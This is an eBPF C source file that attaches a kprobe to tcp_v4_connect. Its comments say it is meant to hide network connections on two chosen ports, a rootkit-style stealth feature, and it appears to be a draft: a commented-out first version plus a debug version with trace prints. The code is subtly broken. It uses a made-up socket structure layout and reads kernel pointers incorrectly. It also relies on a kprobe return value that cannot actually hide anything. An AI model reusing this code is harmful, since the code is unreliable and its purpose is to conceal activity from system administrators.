#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/in.h>
#include <linux/types.h>
#include <linux/ptrace.h>
#include <linux/tcp.h>

// Define hidden ports
#define HIDDEN_PORT1 12345
#define HIDDEN_PORT2 5678

// Structure mimicking part of the kernel's sock_common
struct sock_common {
    __be16 skc_dport;  // Destination port
    __u16  skc_num;    // Source port (host byte order)
};

// Simplified sock structure
struct sock {
    struct sock_common __sk_common;
};

// Architecture-specific macros for PT_REGS_PARM1
#if defined(__x86_64__)
    #define PT_REGS_PARM1(x) ((x)->di)
#elif defined(__aarch64__)
    #define PT_REGS_PARM1(x) ((x)->regs[0])
#else
    #define PT_REGS_PARM1(x) 0  // Default to 0 for unsupported architectures
#endif

#define GET_ARG1(ctx) ((void *)(unsigned long)PT_REGS_PARM1(ctx))

// Probe for tcp_v4_connect
/*SEC("kprobe/tcp_v4_connect")
int bpf_prog1(struct pt_regs *ctx) {
    struct sock *sk;

    // Use bpf_probe_read_kernel to access the first argument (kernel memory)
    if (bpf_probe_read_kernel(&sk, sizeof(sk), GET_ARG1(ctx)) != 0) {
        return 0;
    }

    if (!sk) {
        return 0;
    }

    // Access source and destination ports
    __u16 sport = __builtin_bswap16(sk->__sk_common.skc_num);
    __u16 dport = __builtin_bswap16(sk->__sk_common.skc_dport);

    // Hide the ports if they match the hidden ones
    if (sport == HIDDEN_PORT1 || sport == HIDDEN_PORT2 ||
        dport == HIDDEN_PORT1 || dport == HIDDEN_PORT2) {
        return 0;  // Hide these ports
    }

    return 1;  // Allow all other connections
}*/
SEC("kprobe/tcp_v4_connect")
int bpf_prog1(struct pt_regs *ctx) {
    struct sock *sk;

    // Try to read the first argument
    if (bpf_probe_read_kernel(&sk, sizeof(sk), GET_ARG1(ctx)) != 0) {
        //bpf_trace_printk("Failed to read argument\n");
	bpf_trace_printk("Failed to read argument\n", sizeof("Failed to read argument\n"));
        return 0;
    }

    if (!sk) {
	bpf_trace_printk("sk is null\n", sizeof("sk is null\n"));
        //bpf_trace_printk("sk is null\n");
        return 0;
    }

    // Debugging socket fields
    __u16 sport = __builtin_bswap16(sk->__sk_common.skc_num);
    __u16 dport = __builtin_bswap16(sk->__sk_common.skc_dport);
    bpf_trace_printk("sport: %u, dport: %u\n", sport, dport);

    if (sport == HIDDEN_PORT1 || sport == HIDDEN_PORT2 ||
        dport == HIDDEN_PORT1 || dport == HIDDEN_PORT2) {
        return 0;
    }

    return 1;
}

char _license[] SEC("license") = "GPL";
